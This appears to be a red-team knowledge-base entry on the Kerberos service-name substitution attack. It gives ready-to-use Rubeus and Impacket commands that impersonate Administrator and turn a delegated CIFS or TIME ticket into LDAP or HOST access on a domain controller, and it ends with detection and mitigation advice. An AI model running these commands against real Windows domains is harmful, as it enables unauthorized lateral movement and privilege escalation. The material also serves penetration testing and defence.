---
tags:
  - "#type/technique"
  - "#tactic/TA0008"
  - "#technique/T1558"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#protocol/kerberos"
  - "#tool/rubeus"
  - "#tool/impacket"
  - "#tool/delegations"
aliases:
  - Alternate Service Name
  - SPN Manipulation
  - Kerberos Service Substitution
  - Service Principal Name Substitution
---
## Technique
___
The Alternate Service Name attack (also known as Service Principal Name Substitution) exploits a design feature in Kerberos where the service principal name (SPN) in a service ticket is not encrypted or integrity-protected. This allows an attacker to modify the service name field in a valid Kerberos ticket to access services that weren't originally authorized.

This technique works because when a service validates a Kerberos ticket, it only checks:
1. That the ticket was encrypted with its own key
2. That the target computer name matches

However, it doesn't verify that the service type (e.g., CIFS, LDAP, HOST) in the ticket matches the service it's actually providing. This allows for "service substitution" where a ticket for one service (e.g., CIFS) can be modified to access another service (e.g., LDAP) on the same machine.

## Prerequisites
___

**Access Level:** Depends on the approach, but generally requires:
- A valid TGT for a service account with delegation rights, OR
- Access to S4U2Self + S4U2Proxy techniques, OR
- An existing service ticket that can be modified

**System State:** 
- The target system must have multiple services (e.g., CIFS, LDAP, HOST) running
- The target service must not implement additional validation beyond standard Kerberos checks

**Information:** Knowledge of available services on the target machine

## Considerations
___

**Impact**

This attack allows lateral movement between different services on the same machine using a single service ticket. This is particularly powerful for privilege escalation when combined with constrained delegation, as it can bypass the service-type restrictions of the delegation.

**OPSEC**

- **Ticket Anomalies:** Some security monitoring solutions may flag tickets where the requested service (in logs) doesn't match the actual service being accessed.
  
- **Service Mismatch:** Accessing unusual service combinations might trigger alerts in environments with proper security monitoring.
  
- **Unusual Authentication Patterns:** Accessing services that a user or account doesn't typically use might be detected.

## Execution
___

### Attack Scenarios

#### Scenario 1: Using S4U2Self + Service Substitution

In this scenario, we have a compromised service account with constrained delegation rights, but the delegation is restricted to a less valuable service (e.g., CIFS). We can use S4U2Self to get a ticket and then modify it to access a more valuable service (e.g., LDAP).

#### Scenario 2: Direct Service Substitution

If we already have a service ticket for one service, we can modify it to access another service on the same machine.

### Using Rubeus (Windows)

**Scenario 1: S4U2Self + Service Substitution**

```powershell
# Get a TGT for the service account
Rubeus.exe asktgt /user:SERVICE_ACCOUNT$ /domain:domain.local /rc4:NTLM_HASH /nowrap

# Use S4U2Self with service substitution
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /ticket:BASE64_TGT \
    /impersonateuser:TARGET_USER /self /altservice:ldap/server.domain.local /ptt
```

**Scenario 2: S4U2Proxy + Service Substitution**

```powershell
# Full S4U2Self + S4U2Proxy + altservice in one command
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /domain:domain.local /rc4:NTLM_HASH \
    /impersonateuser:Administrator /msdsspn:cifs/server.domain.local \
    /altservice:ldap /ptt
```

**Advanced usage with multiple alternate services**

```powershell
# Request multiple alternate services in one command
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /domain:domain.local /rc4:NTLM_HASH \
    /impersonateuser:Administrator /msdsspn:cifs/server.domain.local \
    /altservice:ldap,host,http,wsman,rpcss /ptt
```

**With explicit TGT**

```powershell
# If you already have a TGT
Rubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:Administrator \
    /msdsspn:cifs/server.domain.local /altservice:ldap/server.domain.local /ptt
```

### Using Impacket (Linux)

Impacket doesn't directly support the alternate service name feature as Rubeus does, but you can use it to obtain service tickets and then manipulate them with other tools.

```bash
# Get a TGT for the service account
getTGT.py -dc-ip DC_IP domain.local/SERVICE_ACCOUNT:PASSWORD

# Get a service ticket for CIFS
getST.py -dc-ip DC_IP -spn cifs/server.domain.local \
    -impersonate Administrator domain.local/SERVICE_ACCOUNT -k

# Use other tools to modify the SPN in the ticket
```

### Using Delegations Tool

The Delegations tool can help you identify constrained delegation configurations that might be vulnerable to service substitution:

```bash
# Find constrained delegations in the domain
./Delegations find constrained --dc-ip DC_IP -d domain.local -u USER -p PASSWORD
```

After identifying vulnerable configurations, you can use Rubeus for the actual service substitution attack.

### Common Service Substitution Targets

| Original Service | Substitute Service | Potential Impact |
|------------------|--------------------|-----------------|
| CIFS             | LDAP               | Directory querying/modification |
| CIFS             | HOST               | Remote command execution |
| HTTP             | WSMAN              | PowerShell Remoting |
| HTTP             | RPCSS              | RPC calls |
| TIME             | LDAP               | Directory access |
| Any              | KRBTGT             | Potential TGT request (rarely works) |

### Real-World Examples

**Example 1: CIFS to LDAP Substitution**

```powershell
# Obtain a ticket for CIFS but use it for LDAP
Rubeus.exe s4u /user:webserver$ /domain:domain.local /rc4:NTLM_HASH \
    /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local \
    /altservice:ldap /ptt

# Then use the ticket for LDAP operations
Add-Type -AssemblyName System.DirectoryServices
$ldap = New-Object System.DirectoryServices.DirectoryEntry
$searcher = New-Object System.DirectoryServices.DirectorySearcher($ldap)
$searcher.FindAll()
```

**Example 2: TIME to HOST Substitution**

```powershell
# Obtain a ticket for TIME but use it for HOST services
Rubeus.exe s4u /user:timeserver$ /domain:domain.local /rc4:NTLM_HASH \
    /impersonateuser:Administrator /msdsspn:time/target.domain.local \
    /altservice:host /ptt

# Then use it for WMI operations
Get-WmiObject -Class Win32_OperatingSystem -ComputerName target.domain.local
```

## Detection & Mitigation
___

### Detection

- Monitor for discrepancies between requested service types and accessed services
- Look for unusual service ticket requests, especially from service accounts
- Implement security monitoring for sensitive service access (LDAP, HOST, etc.)
- Watch for service tickets being used for services not matching the original SPN
- Analyze authentication logs for anomalous service access patterns

### Mitigation

- Implement service-specific application-level authentication checks beyond Kerberos
- Use additional authentication factors for sensitive services
- Carefully review and limit constrained delegation configurations
- Mark sensitive accounts as "Account is sensitive and cannot be delegated"
- Place privileged accounts in the Protected Users group
- Follow the principle of least privilege for service accounts
- Regularly review and validate SPNs in your environment
- Configure network segmentation to restrict access to sensitive services

## Technical Notes
___

- The SPN field in Kerberos service tickets is not protected by the PAC (Privilege Attribute Certificate) checksum
- The primary limitation is that you can only substitute services on the same machine
- Some services may implement additional validation that can prevent this attack
- Microsoft considers this behavior a design feature rather than a vulnerability
- The attack is most effective when combined with constrained delegation
- Service substitution works because the service name is stored in the `sname` field of the ticket, which is not encrypted
- Windows Server 2022 and newer versions may have additional protections against certain service substitution scenarios
